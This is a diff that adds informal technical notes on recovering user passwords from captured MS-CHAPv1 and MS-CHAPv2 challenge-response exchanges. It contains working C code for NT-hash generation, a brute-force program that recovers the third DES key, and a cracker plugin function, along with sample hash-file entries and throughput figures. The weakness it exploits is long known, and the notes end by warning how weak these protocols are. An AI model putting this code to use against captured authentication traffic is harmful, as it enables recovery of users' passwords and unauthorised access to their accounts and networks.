@@ -1,0 +1,238 @@
+
+just some notes..thats all.
+
+Here is the routine to generate the NT hash which is essentially MD4 hash
+of the users unicode password.
+
+not real unicode conversion of course..
+
+void NtPasswordHash(char Password[], unsigned char PasswordHash[])
+{
+	MD4_CTX ctx;
+	size_t PassLen;
+	unsigned short uni_pwd[256]={0};
+	
+	PassLen = strlen(Password);
+
+	for(size_t i = 0;i < PassLen && i < 128;i++)
+		uni_pwd[i] = Password[i];
+
+	MD4_Init(&ctx);
+	MD4_Update(&ctx,uni_pwd,PassLen*2);
+	MD4_Final(PasswordHash,&ctx);
+}
+
+Result of no password is 0x31d6cfe0d16ae931b73c59d7e0c089c0
+Pad with 5 null bytes and split into 3 7 byte DES keys.
+
+
+          8-Byte Key 1     8-Byte Key 2     8-Byte Key 3
+          **************************************************
+          0x31d6cfe0d16ae9 0x31b73c59d7e0c0 0x89c00000000000
+
+          8-Byte Random Challenge from Server
+          ***********************************
+          0x1f3bae2c53ea0895
+
+Encrypt the server challenge using DES in ECB mode, separately
+using the 3 8-byte keys.
+
+          DES1 = 0x94add91f61df1289 = DES_ECB(0x1f3bae2c53ea0895,0x31d6cfe0d16ae9)
+          DES2 = 0xed76adbb86511e70 = DES_ECB(0x1f3bae2c53ea0895,0x31b73c59d7e0c0)
+          DES3 = 0xe69cc6673729d053 = DES_ECB(0x1f3bae2c53ea0895,0x89c00000000000)
+
+Now we have 24-Byte Client response.
+
+          DES Ciphertext 1                    2                  3
+          ********************************************************
+          0x94add91f61df1289 0xed76adbb86511e70 0xe69cc6673729d053
+          
+         
+As pointed out by Mudge already (many years ago), if you look at the 3rd DES key, it
+contains the last 2 bytes of the NTLM hash.
+
+Recover the 3rd DES 8-Byte key which should require no more than 65,536
+brute force attempts.
+
+Then, recovery of password should initially only require creating an NTLM hash
+and comparing last 16-bits of this with 3rd DES 8-Byte key.
+
+of course, after this you would encrypt the challenge and compare with captured response.
+
+The following is just example with hard-coded values of how to get the 3rd DES key
+
+------------------------------------------------- snip find_key.cpp
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <openssl/des.h>
+
+void DesEncrypt(unsigned char Clear[], unsigned char Key[], unsigned char Cypher[])
+{
+	unsigned char des_key[8]={0};
+	DES_key_schedule ks;
+	
+	des_key[0] = ((Key[0] >> 1));
+	des_key[1] = ((Key[0] & 0x01) << 6) | (Key[1] >> 2);
+	des_key[2] = ((Key[1] & 0x03) << 5) | (Key[2] >> 3);
+	des_key[3] = ((Key[2] & 0x07) << 4) | (Key[3] >> 4);
+	des_key[4] = ((Key[3] & 0x0f) << 3) | (Key[4] >> 5);
+	des_key[5] = ((Key[4] & 0x1f) << 2) | (Key[5] >> 6);
+	des_key[6] = ((Key[5] & 0x3f) << 1) | (Key[6] >> 7);
+	des_key[7] = ((Key[6] & 0x7f));
+	
+	for(int i = 0;i < 8;i++)
+		des_key[i] = (des_key[i] << 1);
+	
+	DES_set_odd_parity((DES_cblock*)des_key);
+
+	DES_set_key_unchecked((DES_cblock*)&des_key,&ks);
+	DES_ecb_encrypt((DES_cblock*)Clear,(DES_cblock*)Cypher,&ks,DES_ENCRYPT);
+}
+
+int main(int argc, char *argv[])
+{
+	unsigned char des_key[8]={0};
+	unsigned char challenge[8]={0x1f,0x3b,0xae,0x2c,0x53,0xea,0x08,0x95};       // random 8-byte challenge from server
+	unsigned char response[8]={0xe6,0x9c,0xc6,0x67,0x37,0x29,0xd0,0x53};        // last 8-bytes of response from client
+	unsigned char result[8];
+
+	for(unsigned char i = 0;i < 255;i++)
+	{
+		des_key[0] = i;
+
+		for(unsigned char j = 0;j < 255;j++)
+		{
+			des_key[1] = j;
+
+			DesEncrypt(challenge,des_key,result);
+
+			if(memcmp(result,response,8) == 0)
+			{
+				printf("\n3rd 8-Byte DES key = ");
+				printf("0x%02x%02x0000000000\n\n",des_key[0],des_key[1]);
+				return(0);
+			}
+		}
+	}
+	printf("\nNot found\n");
+	return(0);
+}
+
+------------------------------------------------- end snip find_key.cpp
+
+After running this code, we obviously find the 3rd DES key and last 16 bits of NTLM hash
+
+      3rd 8-Byte DES key = 0x89c00000000000
+      
+To recover the full user password.
+Create the NTLM hash from a test password, compare last 16-bits with 3rd DES key we've recovered.
+
+If we have collision..
+Encrypt the challenge using first 7 bytes of NTLM hash to get 8 byte DES ciphertext.
+Compare with our response, if equal, print the test password, else continue.
+
+Here is what PasswordsPro entry would look like with USERNAME:24-Byte CLIENT_RESPONSE:SERVER_CHALLENGE
+
+    Administrator:94add91f61df1289ed76adbb86511e70e69cc6673729d053:1f3bae2c53ea0895::Password is empty
+
+Why not just check first 8-Bytes instead and avoid 2 encryptions with DES?
+
+    Administrator:94add91f61df1289:1f3bae2c53ea089589c0::Password is empty
+
+MS-CHAPv2 is exactly the same, except for how the challenge is generated.
+
+Both the server/client generates a 16-Byte challenge, this is then processed with username
+through SHA-1 to derive an 8-Byte challenge.
+
+Here is the new routine to do this..
+
+void ChallengeHash(unsigned char PeerChallenge[], unsigned char AuthChallenge[],
+		   char UserName[], unsigned char Challenge[])
+{
+	SHA_CTX ctx;
+	unsigned char Digest[20];
+	
+	SHA1_Init(&ctx);
+	SHA1_Update(&ctx,PeerChallenge,16);
+	SHA1_Update(&ctx,AuthChallenge,16);
+
+	SHA1_Update(&ctx,UserName,strlen(UserName));
+	SHA1_Final(Digest,&ctx);
+	memcpy(Challenge,Digest,8);
+}
+
+But this really doesn't slow down our previous attack on MS-CHAPv1 at all.
+Its pretty redundant for our attack atleast..
+
+We simply pre-compute this first before using the same attack against MS-CHAPv1
+If the PasswordsPro entry for MS-CHAPv2 was:
+
+    Administrator:db168f69f23c3869a61a471282ff6f8689eafda5205dd414:1f3bae2c53ea0895ebc093ab67afc830aca8c2154990d24cd5b489718061df39::Password is ""
+
+The above format is:
+
+    USERNAME:24-Byte CLIENT_RESPONSE:16-Byte SERVER_CHALLENGE:16-Byte CLIENT_CHALLENGE
+
+We first use the USERNAME,SERVER_CHALLENGE and CLIENT_CHALLENGE to derive challenge used in deriving the CLIENT_RESPONSE
+
+Check first 8-Bytes of Client response only, that means only 1 encryption, which is obviously much faster
+than checking all 3.
+
+We already know last 16-bits of NTLM hash since it is 3rd DES key used to encrypt challenge.
+Its pointless to waste CPU cycles encrypting what we already know.
+
+   Administrator:db168f69f23c3869:f7282a3181f04ab689c0::Password is empty
+   
+Essentially we are still attacking the MS-CHAPv1 hash and nothing else.
+Its possible to use a table of NTLM hashes to find which ones match
+our 3rd DES key, recovered through brute force.
+
+Then try that hash to see if it works for us.
+
+The GetHash code is as follows:
+
+extern "C" __declspec(dllexport) int GetHash(HASHINFO *info)
+{
+       unsigned char nt_hash[16];
+       unsigned char des_key[8];
+       unsigned char ks[128];
+       unsigned char nt_response[8]={0};
+
+       // generate the nt hash first
+       ntlm1_hash(info->szPassword,info->nPasswordLen,nt_hash);
+
+       // check if last 16-bits of NTLM hash are equal to known 3rd DES key
+       if(nt_hash[14] == ((unsigned char*)info->szSalt)[8] &&
+          nt_hash[15] == ((unsigned char*)info->szSalt)[9])
+       {
+           // store 8 byte challenge
+           memcpy(nt_response,info->szSalt,8);
+
+           // generate 1st DES key
+           str_to_key(nt_hash,des_key);
+
+           // create key schedule
+           DES_set_key(des_key,ks);
+
+           // encrypt challenge
+           _des_encrypt(nt_response,ks,1);
+       }
+
+       // return null bytes or result of encrypted challenge
+       memcpy(info->pBuf,nt_response,8);
+       return 8;
+}
+
+Using Full algorithm: 1.7 million k/s
+After Optimization  : 6.0 million k/s
+
+There is still room to improve speed of code, but as shown, a little pre-computation goes along way.
+We see how there is really no extra security for the client response in MS-CHAPv2 compared to MS-CHAPv1
+and it is this scheme which protects the users password from being compromised.
+
+Of course it has been well known for many years by some that the MS-CHAPv1 and MS-CHAPv2 authentication 
+protocols are weak and easily broken, but how many still using MS VPN today are aware of how really bad it is?
+
